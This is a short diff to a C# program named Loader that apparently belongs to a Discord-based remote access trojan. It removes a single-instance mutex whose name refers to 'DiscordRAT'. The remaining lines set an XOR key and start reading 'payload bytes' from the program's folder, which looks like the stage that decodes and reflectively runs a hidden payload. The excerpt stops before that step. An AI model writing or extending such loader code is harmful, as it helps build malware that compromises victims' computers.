@@ -1,25 +1,16 @@
 using System;
 using System.IO;
 using System.Reflection;
-using System.Threading;
 
 namespace Loader
 {
     internal static class Program
     {
         private const byte XorKey = 0xA7;
-        private static Mutex instanceMutex;
 
         [STAThread]
         private static void Main()
         {
-            bool created;
-            instanceMutex = new Mutex(true, @"Global\DiscordRAT_ShaherDev_v1", out created);
-            if (!created)
-            {
-                return;
-            }
-
             string baseDir = AppDomain.CurrentDomain.BaseDirectory;
             byte[] payloadBytes = LoadPayloadBytes(baseDir);
             if (payloadBytes == null || payloadBytes.Length == 0)
